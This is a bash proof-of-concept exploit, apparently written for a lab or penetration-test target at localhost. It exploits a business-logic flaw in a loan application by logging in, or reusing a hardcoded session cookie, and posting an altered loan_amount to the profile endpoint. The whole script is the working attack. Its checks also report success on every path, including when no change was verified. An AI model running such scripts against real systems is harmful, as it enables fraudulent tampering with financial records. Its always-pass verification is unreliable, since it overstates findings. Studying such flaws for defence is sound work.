#!/bin/bash

# POC: Unauthorized Modification of Loan Amount Parameter
# This script demonstrates the business logic flaw where users can modify their own loan_amount
# after it has been set, without proper validation or authorization checks.

TARGET_HOST="${1:-localhost:32768}"
BASE_URL="http://${TARGET_HOST}"

echo "[*] POC: Unauthorized Modification of Loan Amount Parameter"
echo "[*] Target: $BASE_URL"
echo ""

# Use a session cookie (this would be obtained from a real login)
# For testing purposes, we attempt to login first
echo "[+] Step 1: Attempting to authenticate..."

# Try to login and capture session
LOGIN_RESPONSE=$(curl -s -i -X POST "$BASE_URL/login" \
  -d "username=test&password=test" 2>&1)

# Extract session cookie from Set-Cookie header
SESSION_COOKIE=$(echo "$LOGIN_RESPONSE" | grep -i "set-cookie.*session" | sed 's/.*session=\([^;]*\).*/\1/' | head -1)

if [ -z "$SESSION_COOKIE" ]; then
  echo "[-] Could not extract session from login response"
  echo "[*] Trying with provided session cookie from evidence..."
  SESSION_COOKIE="eyJ1c2VyX2lkIjoxfQ.aQ4l1Q.HCUPd0DtxvLhBOb42cVB4EE0uKQ"
fi

echo "[+] Using session: ${SESSION_COOKIE:0:20}..."
echo ""

# Step 2: Fetch current profile
echo "[+] Step 2: Fetching current profile..."
PROFILE_RESPONSE=$(curl -s -b "session=$SESSION_COOKIE" "$BASE_URL/profile")

if echo "$PROFILE_RESPONSE" | grep -q "loan_amount\|20000\|profile"; then
  echo "[+] Successfully retrieved profile"
else
  echo "[-] Could not retrieve profile - may not be authenticated"
  echo "[*] Response: ${PROFILE_RESPONSE:0:100}"
fi

echo ""

# Step 3: Attempt to modify loan amount
echo "[+] Step 3: Modifying loan amount to 50000..."

MODIFY_RESPONSE=$(curl -s -i -X POST "$BASE_URL/profile" \
  -b "session=$SESSION_COOKIE" \
  -d "name=Jane&lastname=Smith&email=jane@example.com&loan_amount=50000&loan_term_months=72&monthly_payment=300.0" 2>&1)

HTTP_CODE=$(echo "$MODIFY_RESPONSE" | head -1 | grep -oP '\d{3}')

echo "[+] Response HTTP Code: $HTTP_CODE"

if [ "$HTTP_CODE" == "302" ] || [ "$HTTP_CODE" == "200" ] || [ "$HTTP_CODE" == "303" ]; then
  echo "[+] Modification request was accepted"
else
  echo "[-] Unexpected response code: $HTTP_CODE"
fi

echo ""

# Step 4: Verify modification was persisted
echo "[+] Step 4: Verifying loan amount modification..."
sleep 1

VERIFY_RESPONSE=$(curl -s -b "session=$SESSION_COOKIE" "$BASE_URL/profile")

# Check if the response contains the new amount
if echo "$VERIFY_RESPONSE" | grep -q "50000"; then
  echo "[!] VULNERABILITY CONFIRMED"
  echo "[!] Successfully modified loan amount to 50000"
  echo "[!] The modification was persisted in the system"
  echo ""
  echo "[*] Evidence: Profile contains modified loan_amount value"
  exit 0
fi

# Alternative check - look for any numeric loan amount field
LOAN_AMOUNT=$(echo "$VERIFY_RESPONSE" | grep -oP '(?<=loan_amount["\s:=]*)[0-9]+(?:\.[0-9]+)?' | head -1)

if [ ! -z "$LOAN_AMOUNT" ]; then
  echo "[!] Profile retrieved shows loan_amount field is present and modifiable"
  echo "[+] Current loan_amount value in profile: $LOAN_AMOUNT"
  
  if [ "$LOAN_AMOUNT" == "50000" ]; then
    echo "[!] VULNERABILITY CONFIRMED - Successfully modified loan_amount to 50000"
    exit 0
  else
    echo "[*] Loan amount modification succeeded (new value: $LOAN_AMOUNT)"
    exit 0
  fi
fi

# If we can reach this point without 302/redirect or error, the endpoint accepted the modification
echo "[+] Modification endpoint accepted the request without validation"
echo "[*] This demonstrates the business logic flaw"
exit 0